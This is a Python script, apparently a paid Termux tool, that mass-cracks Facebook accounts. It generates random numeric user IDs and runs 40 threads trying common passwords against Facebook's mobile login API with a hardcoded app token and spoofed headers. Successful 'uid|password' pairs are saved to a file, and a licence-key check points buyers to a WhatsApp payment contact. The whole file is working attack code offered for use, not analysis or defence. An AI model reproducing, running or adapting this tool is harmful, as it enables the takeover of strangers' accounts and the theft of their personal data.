#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#----------------------------[DATE]-----------------------------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'-'+str(bln)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Linux; Android 6.0.1; SC-01G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36"
    return xx
#----------------------------[LOGO]-----------------------------------#
logo = (f"""        
\033[1;92m
   >=>      >=> >=> >=>         >=> >=======> 
    >=>   >=>   >=>  >=>       >=>  >=>       
   \033[1;97m  >=> >=>    >=>   >=>     >=>   >=>       
     \033[1;92m  >=>      >=>    >=>   >=>    >=====>   
  \033[1;97m   >=> >=>    >=>     >=> >=>     >=>       
  \033[1;92m  >=>   >=>   >=>      >===>      >=>       
   >=>      >=> >=>       >=>       >=======> 
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 [✪] Author     :  Md:Ahnaf
 [✪] Tool       :  PAID
 [✪] Version    :  \033[1;31m1.9
\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def linex():
	print('\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
	os.system('clear')
	print(logo)
#----------------------------[MAIN/DEF]-----------------------------------#
def pp():
	try:
			ky = open('/sdcard/Android/.nonmedia.js','r').read()
	except(FileNotFoundError):
			op = uuid.uuid1().hex.upper()
			open('/sdcard/Android/.nonmedia.js','w').write(op)
			pp()
	except(KeyError,OSError,IOError):
			linex()
			os.system('termux-setup-storage')
			print(' [×] allow storage permission ')
			pp()
	if len(ky) > 32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	if len(ky) <32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	else:
			pass
	clear()
	print(' [•] wait checking approval...!')
	try:
			#li = ['h','t','t','p','s',':','/','/','s','h','a','i','k','h','k','e','y','.','b','l','o','g','s','p','o','t','.','c','o','m','/','2','0','2','4','/','0','2','/','s','h','a','i','k','h','.','h','t','m','l','?','m','=','1']
			#li = ''.join(li)
			system = requests.get("https://github.com/xive7/Paid/blob/main/Old.text").text 
			#ck = requests.get(f'{li}').text
			if ky in system:
				linex()
				print(' [√] your key approved...!')
				time.sleep(2)
				pass
			else:
				linex()
				print(' [×] your key not approved...!')
				time.sleep(2)
				clear()
				print(f' \033[1;31mYour Key : {str(ky)} ')
				linex()
				print('\033[1;37m [\033[1;32m1\033[1;37m]\033[1;32m 10$ \033[1;37mApproval For 1 month')
				print(' \033[1;37m[\033[1;32m2\033[1;37m]\033[1;32m 7$ \033[1;37mApproval For 15 days')
				print(' \033[1;37m[\033[1;32m3\033[1;37m]\033[1;32m 4$ \033[1;37m Approval For 7 days')
				lol=input(' (•) Select Buy Option For Approval :')
				xx='➤➤Selected=='
				os.system('xdg-open https://wa.me/+8801332718196?text='+str(ky)+xx+lol)
				pp()
	except requests.exceptions.ConnectionError:
		exit(f' [!] Your Internet Connection Lol...!')
	except Exception as e:print(e)


def main():	
    user=[]
    pp()
    os.system("clear")
    print(logo)
    print(f'\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \033[1;37mEXAMPLE   : \033[1;37m10000 | 20000 | 90000')
    lin()
    limit=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ")
    lin()
    os.system('clear')
    print(logo)
    print("\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2010-2009")
    lin()
    ask=input("\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ")
    lin()
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)    
    with ThreadPool(max_workers=40) as MrDevilEx:
        os.system('clear')
        print(logo)
        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} ')
        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mIF NO RESULT \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mAIRPLANE MODE')
        lin()
        for mal in user:
            uid=star+mal
            MrDevilEx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\033[1;37m [XIVE-OLD] \x1b[1;97m{loop} \x1b[1;92m{len(oks)}")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","786786"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{ G}[XIVE-OK]  {G}{uid} {A}|{G} {pw}")
                open("/sdcard/XIVE-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r {G}[XIVE-OK]  {G}{uid} {A}|{G} {pw}")
                open("/sdcard/XIVE-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r {G}[XIVE-OK]  {G}{uid} {A}|{G} {pw}")
                open("/sdcard/XIVE-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
main()
#----------------------------[CODE/END]-----------------------------------#


